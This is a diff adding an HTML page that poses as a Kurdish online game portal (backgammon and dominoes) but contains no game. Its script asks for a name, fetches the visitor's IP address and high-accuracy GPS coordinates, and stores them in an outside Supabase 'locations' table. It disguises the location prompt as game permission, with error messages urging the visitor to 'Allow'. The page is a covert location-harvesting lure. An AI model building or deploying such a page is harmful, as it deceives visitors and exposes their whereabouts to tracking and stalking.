@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="یارییە کوردییەکان - تاوڵە و دۆمینەی ئۆنلاین">
+  <meta property="og:description" content="یاری ئۆنلاین لەگەڵ هاوڕێکانت بکە بە بێ داگرتن">
+  <meta property="og:image" content="https://yoursite.com/game-cover.jpg">
+  <meta property="og:type" content="website">
+
+  <title>یارییە کوردییەکان</title>
+
+  <style>
+    :root {
+      --bg: #0f172a;
+      --card: #1e293b;
+      --input: #0f172a;
+      --border: #334155;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --blue: #2563eb;
+      --blue-hover: #1d4ed8;
+      --gray: #334155;
+      --gray-hover: #475569;
+      --red: #ef4444;
+      --green: #22c55e;
+      --yellow: #f59e0b;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .card {
+      background: var(--card);
+      max-width: 420px;
+      width: 100%;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+      margin-bottom: 12px;
+      color: var(--text);
+    }
+
+    p {
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.7;
+      margin-bottom: 20px;
+    }
+
+    #languageScreen {
+      display: block;
+    }
+
+    .language-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .language-btn {
+      flex: 1;
+      padding: 13px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      background: var(--input);
+      color: var(--text);
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .language-btn:hover {
+      background: var(--gray);
+      border-color: var(--blue);
+    }
+
+    .language-btn.active {
+      background: var(--blue);
+      border-color: var(--blue);
+    }
+
+    #nameScreen {
+      display: none;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--input);
+      color: #fff;
+      font-size: 15px;
+      text-align: center;
+      outline: none;
+    }
+
+    input[type="text"]:focus {
+      border-color: var(--blue);
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 10px;
+    }
+
+    button.action-btn {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    #allow {
+      background: var(--blue);
+      color: white;
+    }
+
+    #allow:hover {
+      background: var(--blue-hover);
+    }
+
+    #deny {
+      background: var(--gray);
+      color: #cbd5e1;
+    }
+
+    #deny:hover {
+      background: var(--gray-hover);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 14px;
+      line-height: 1.6;
+      word-break: break-word;
+    }
+
+    .change-language {
+      margin-top: 18px;
+      background: transparent;
+      border: none;
+      color: var(--muted);
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .change-language:hover {
+      color: white;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 24px 20px;
+      }
+
+      .language-buttons,
+      .btn-group {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <!-- LANGUAGE SELECTION -->
+    <div id="languageScreen">
+      <h2>زمانەکە هەڵبژێرە/ عربی / Choose your language</h2>
+      <p>تکایە زمانەکەت هەڵبژێرە/عربی تواضع / Please choose your language</p>
+      <div class="language-buttons">
+        <button type="button" class="language-btn" id="kurdishBtn">کوردی</button>
+        <button type="button" class="language-btn" id="englishBtn">English</button>
+        <button type="button" class="language-btn" id="arabicBtn">عربی</button>
+      </div>
+    </div>
+
+    <!-- NAME + LOCATION -->
+    <div id="nameScreen">
+      <h2 id="title">چونەژوورەوە</h2>
+      <p id="description">ناوت تۆمار بکە.</p>
+
+      <input type="text" id="username" placeholder="ناوەکەت بنووسە..." autocomplete="name">
+
+      <div class="btn-group">
+        <button type="button" class="action-btn" id="allow">یاری کردن</button>
+        <button type="button" class="action-btn" id="deny">ڕەتکردنەوە</button>
+      </div>
+
+      <div id="result"></div>
+
+      <button type="button" class="change-language" id="changeLanguage">گۆڕینی زمان</button>
+    </div>
+
+  </div>
+
+  <!-- SUPABASE -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
+
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const SUCCESS_IMAGE_URL = "https://i.ibb.co/m58yfTHK/IMG-3457.jpg";
+
+    const languageScreen = document.getElementById("languageScreen");
+    const nameScreen = document.getElementById("nameScreen");
+    const kurdishBtn = document.getElementById("kurdishBtn");
+    const englishBtn = document.getElementById("englishBtn");
+    const title = document.getElementById("title");
+    const description = document.getElementById("description");
+    const usernameInput = document.getElementById("username");
+    const allowButton = document.getElementById("allow");
+    const denyButton = document.getElementById("deny");
+    const result = document.getElementById("result");
+    const changeLanguage = document.getElementById("changeLanguage");
+
+    const translations = {
+      ku: {
+        direction: "rtl",
+        title: "چونەژوورەوە",
+        description: "تکایە ناوەکەت بنووسە و کلیک لە بەردەوام بوون بکە.",
+        placeholder: "ناوەکەت بنووسە...",
+        allow: "بەردەوام بوون",
+        deny: "ڕەتکردنەوە",
+        change: "گۆڕینی زمان",
+        emptyName: "❌ تکایە پێشتر ناوەکەت بنووسە!",
+        noLocation: "❌ پێگەڕەکەت پشتیوانی وەرگرتنی شوێن ناکات.",
+        requesting: "⏳ داواکاری زانیارییەکان دەکرێت...",
+        saving: "⏳ زانیارییەکان تۆمار دەکرێن...",
+        success: "✅ بە سەرکەوتوویی ئەنجامتدا!",
+        databaseError: "⚠️ زانیارییەکان تۆمار نەکرا!",
+        permissionDenied: "❌  ڕێگەپێدانی یاریکردن ڕەتکرایەوە. تکایە دوبارە چونەژورەوە بکەوە Allow بکە.",
+        unavailable: "❌ زانیاری شوێنەکەی بەردەست نییە.",
+        timeout: "❌ کاتی بەسەرچوو.",
+        unknown: "❌ هەڵەیەکی نەزانراو ڕووی دا.",
+        cancelled: "ڕەتکردنەوە هەڵبژێردرا."
+      },
+      en: {
+        direction: "ltr",
+        title: "Access",
+        description: "Please enter your name and click Continue.",
+        placeholder: "Enter your name...",
+        allow: "Continue",
+        deny: "Cancel",
+        change: "Change language",
+        emptyName: "❌ Please enter your name first!",
+        noLocation: "❌ Your browser does not support location services.",
+        requesting: "⏳ Requesting info...",
+        saving: "⏳ Saving data...",
+        success: "✅ Successfully done!",
+        databaseError: "⚠️ Could not save to database.",
+        permissionDenied: "❌ playing permission denied refresh and Allow.",
+        unavailable: "❌ playing unavailable.",
+        timeout: "❌ Request timed out.",
+        unknown: "❌ Unknown error occurred.",
+        cancelled: "Cancellation selected."
+      },
+      ar: {
+        direction: "ltr",
+        title: "دخل",
+        description: "اسمک.",
+        placeholder: "اسم...",
+        allow: "روح",
+        deny: "رفض",
+        change: "ل‌‌غا",
+        emptyName: "❌ Please enter your name first!",
+        noLocation: "❌ Your browser does not support location services.",
+        requesting: "⏳ Requesting info...",
+        saving: "⏳ Saving data...",
+        success: "✅ Successfully done!",
+        databaseError: "⚠️ Could not save to database.",
+        permissionDenied: "❌ playing permission denied refresh and Allow.",
+        unavailable: "❌ playing unavailable.",
+        timeout: "❌ Request timed out.",
+        unknown: "❌ Unknown error occurred.",
+        cancelled: "Cancellation selected."
+      }
+    };
+
+    let currentLanguage = "ku";
+
+    function setLanguage(language) {
+      currentLanguage = translations[language] ? language : "ku";
+      const t = translations[currentLanguage];
+
+      document.documentElement.lang = currentLanguage;
+      document.documentElement.dir = t.direction;
+
+      title.textContent = t.title;
+      description.textContent = t.description;
+      usernameInput.placeholder = t.placeholder;
+      allowButton.textContent = t.allow;
+      denyButton.textContent = t.deny;
+      changeLanguage.textContent = t.change;
+
+      kurdishBtn.classList.toggle("active", currentLanguage === "ku");
+      englishBtn.classList.toggle("active", currentLanguage === "en");
+
+      result.innerHTML = "";
+    }
+
+    async function getUserIP() {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+      } catch (err) {
+        return "Unkown IP";
+      }
+    }
+
+    kurdishBtn.addEventListener("click", function () {
+      setLanguage("ku");
+      languageScreen.style.display = "none";
+      nameScreen.style.display = "block";
+      usernameInput.focus();
+    });
+
+    englishBtn.addEventListener("click", function () {
+      setLanguage("en");
+      languageScreen.style.display = "none";
+      nameScreen.style.display = "block";
+      usernameInput.focus();
+    });
+
+    changeLanguage.addEventListener("click", function () {
+      nameScreen.style.display = "none";
+      languageScreen.style.display = "block";
+      result.innerHTML = "";
+    });
+
+    allowButton.addEventListener("click", async function () {
+      const t = translations[currentLanguage];
+      const name = usernameInput.value.trim();
+
+      if (!name) {
+        result.innerHTML = `<span style="color:#ef4444;">${t.emptyName}</span>`;
+        return;
+      }
+
+      if (!navigator.geolocation) {
+        result.innerHTML = `<span style="color:#ef4444;">${t.noLocation}</span>`;
+        return;
+      }
+
+      allowButton.disabled = true;
+      denyButton.disabled = true;
+
+      result.innerHTML = `<span style="color:#3b82f6;">${t.requesting}</span>`;
+
+      const userIP = await getUserIP();
+
+      navigator.geolocation.getCurrentPosition(
+        async function (position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          result.innerHTML = `<span style="color:#3b82f6;">${t.saving}</span>`;
+
+          try {
+            const { error } = await supabaseClient
+              .from("locations")
+              .insert([{ 
+                name: name, 
+                latitude: latitude, 
+                longitude: longitude,
+                ip_address: userIP
+              }]);
+
+            if (error) {
+              console.error("Supabase Error:", error);
+              result.innerHTML = `<span style="color:#f59e0b;">${t.databaseError}</span>`;
+              return;
+            }
+
+            result.innerHTML = `
+              <div style="text-align: center; margin-top: 15px;">
+                <p style="color:#22c55e; font-weight: bold; margin-bottom: 10px;">${t.success}</p>
+                <img 
+                  src="${SUCCESS_IMAGE_URL}" 
+                  alt="Success Photo" 
+                  style="width: 100%; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.4);" 
+                />
+              </div>
+            `;
+
+          } catch (error) {
+            console.error("Unexpected error:", error);
+            result.innerHTML = `<span style="color:#f59e0b;">${t.databaseError}</span>`;
+          } finally {
+            allowButton.disabled = false;
+            denyButton.disabled = false;
+          }
+        },
+        function (error) {
+          let message = t.unknown;
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              message = t.permissionDenied;
+              break;
+            case error.POSITION_UNAVAILABLE:
+              message = t.unavailable;
+              break;
+            case error.TIMEOUT:
+              message = t.timeout;
+              break;
+          }
+
+          result.innerHTML = `<span style="color:#ef4444;">${message}</span>`;
+          allowButton.disabled = false;
+          denyButton.disabled = false;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    });
+
+    denyButton.addEventListener("click", function () {
+      const t = translations[currentLanguage];
+      result.innerHTML = `<span style="color:#94a3b8;">${t.cancelled}</span>`;
+    });
+
+    setLanguage("ku");
+  </script>
+
+</body>
+</html>
